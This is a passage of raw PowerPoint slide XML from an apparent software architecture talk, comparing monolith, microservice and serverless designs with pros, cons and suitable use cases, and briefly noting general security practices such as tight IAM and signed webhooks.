            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>71</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21069118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83FAD-A05D-1CFA-21B0-25F5A07EA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D05F9-93A8-E2A2-4906-AB3990823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DE622-BE47-C332-C844-F85810B869DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Great for:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Early-stage products or MVPs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>internal tools where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>speed of building</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> matters </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>morethan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> perfect scaling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Small teams &amp; low ops headcount</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF25099C-44C6-6BB1-DD61-79FFC5CF68A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>72</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14345959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6C8BA-2F6B-C86A-A5D0-1551318FD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DEEAC-6F8B-BF79-FB73-F07A1F026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C6145-61B5-7A2A-4A2A-F6313A46C9C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Pizza Shop:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Separate stations—dough, toppings, oven, delivery—each with their own tools and KPIs. You can scale the oven team independently, but now you need tickets, handoffs, and quality checks between stations.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Pros:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Team autonomy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> clear ownership per service; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>parallelwork</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Resilience &amp; blast radius:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> a failure can be contained (if designed well).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tailored tech:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> different services can pick languages, datastores, and libraries best suited to their job.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Focused scaling:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> scale only bottlenecked services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Great for:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Larger/multiple teams with ops maturity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Clear domain boundaries (checkout vs. catalog)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>High scale where hotspots exist.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Products with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>strict availability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> goals that benefit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>fromisolating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> failure domains</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Cons:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Operational complexity:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> many deploys, more configs, traffic management, TLS, auth between services.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Observability tax:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> without good tracing, debugging is painful.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Data consistency:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> cross-service transactions need patterns like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>sagas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and idempotency.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Latency &amp; costs:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> network hops add latency; more infra to manage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Great when:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Workloads are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>event-driven</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, spiky, or glue-like; you prefer to buy ops.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You accept </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>provider primitives</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and design for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>idempotency &amp; retries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Security stance: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>tight IAM for each function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>signed events/webhooks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>budget guards</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>dependency hygiene</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (SCA) are table stakes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>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5AA3ABD4-C478-0E8F-4678-AA371519C62E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>73</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26964474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DF467-6710-9248-FB84-445978CD5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577EF-9DE2-D686-A148-E383C4840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773BE-BB66-BB15-6B59-157AB6CBF33C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Token reuse and overly broad scopes make this one worse. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE4C59FF-B9DC-4923-1B03-CF80FCA0624A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>74</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19680431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BD5D8-4A56-F4A7-ED23-EEA24A575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32CA6-57B7-6561-6E33-2AAD4344A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0AE1E-A5AF-58CE-8A67-2CCEE76B4A4C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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31C85D48-682F-68B1-3DB9-E651602C387F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>75</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22338963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7BC95-5459-B630-6924-E2306CB08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5DACC-BA5D-D106-6730-CD736FC3D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481CC-1940-7B13-F079-8B37CF10BFE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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141EDD2F-F307-8ADF-3787-3E2ACAA994F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>76</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17059503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217A1-401A-729C-A213-BFD3DB40C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FCD8B-5E8A-D0FF-F64D-4880690C9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9C80-2DD9-1372-F76B-F63E4AB0ED0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>“edges”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> means any </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>externally reachable entry point</a:t>
            </a:r>
            <a:r>
